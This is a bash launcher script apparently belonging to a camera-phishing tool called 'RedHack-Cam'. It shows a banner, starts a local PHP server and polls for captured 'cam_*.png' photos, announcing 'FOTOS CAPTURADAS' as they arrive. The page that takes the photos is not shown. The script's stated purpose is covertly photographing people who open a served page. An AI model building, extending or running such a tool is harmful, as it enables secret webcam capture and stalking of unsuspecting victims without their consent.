#!/bin/bash
# Script: RedHack-Cam v1.0
# Autor: RedHack-cyper (Cazador)

# Colores
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

clear
echo -e "${BLUE}                   -`                    ${NC}"
echo -e "${BLUE}                  .o+`                   ${CYAN}  ____           _ _   _            _    ${NC}"
echo -e "${BLUE}                 `ooo/                   ${CYAN} |  _ \ ___   __| | | | | __ _  ___| | __${NC}"
echo -e "${BLUE}                `+oooo:                  ${CYAN} | |_) / _ \ / _\` | |_| |/ _\` |/ __| |/ /${NC}"
echo -e "${BLUE}               `+oooooo:                 ${CYAN} |  _ <  __/| (_| |  _  | (_| | (__|   < ${NC}"
echo -e "${BLUE}               -+oooooo+:                ${CYAN} |_| \_\___| \__,_|_| |_|\__,_|\___|_|\_\\${NC}"
echo -e "${BLUE}             \`/:-:++oooo+:               ${NC}"
echo -e "${BLUE}            \`/++++/+++++++:              ${RED}      BY: REDHACK-CYPER [Cazador]     ${NC}"
echo -e "${BLUE}           \`/++++++++++++++:             ${NC}"
echo -e "${BLUE}          \`/+++ooooooooooooo/\`           ${NC} SISTEMA: Arch Linux ARM [Termux]     "
echo -e "${BLUE}         ./ooossssqtttssssooo+-          ${NC} ESTADO:  Listo para la caza...       "
echo -e "${BLUE}        .ooosssshhhwwshhhhsssooo.        ${NC}"
echo -e "${BLUE}       -osssssshhhhhhhshhhhhhhssso-      ${NC}"
echo -e "${BLUE}      :osssssshhhhhhhhhshhhhhhhssso:     ${NC}"
echo -e "${BLUE}     /osssssshhhhhhhhhhhshhhhhhhssso/    ${NC}"
echo -e "${BLUE}    .osssssshhhhhhhhhhhhhshhhhhhhssso.   ${NC}"
echo -e "${BLUE}   \`osssssshhhhhhhhhhhhhhhshhhhhhhssso\`  ${NC}"
echo -e "${BLUE}   .osssshhhhhhhhhhhhhhhhhhhshhhhhhssso. ${NC}"
echo -e "${BLUE}   \`osshhhhhhhhhhhhhhhhhhhhhhhshhhhhhss\` ${NC}"
echo ""

# Iniciar servidor
echo -e "${CYAN}[+] Encendiendo servidor local...${NC}"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

echo -e "${CYAN}[+] URL local: http://127.0.0.1:8080${NC}"
echo -e "${RED}[!] Esperando fotos (Presiona Ctrl+C para salir)...${NC}"
echo "--------------------------------------------------------"

# Monitoreo
while true; do
    count=$(ls cam_*.png 2>/dev/null | wc -l)
    if [ $count -gt 0 ]; then
        echo -e "${RED}[🚨] FOTOS CAPTURADAS: $count ${NC}"
        ls -t cam_*.png | head -n 5
    fi
    sleep 10
done

# Matar PHP al salir
kill $PHP_PID
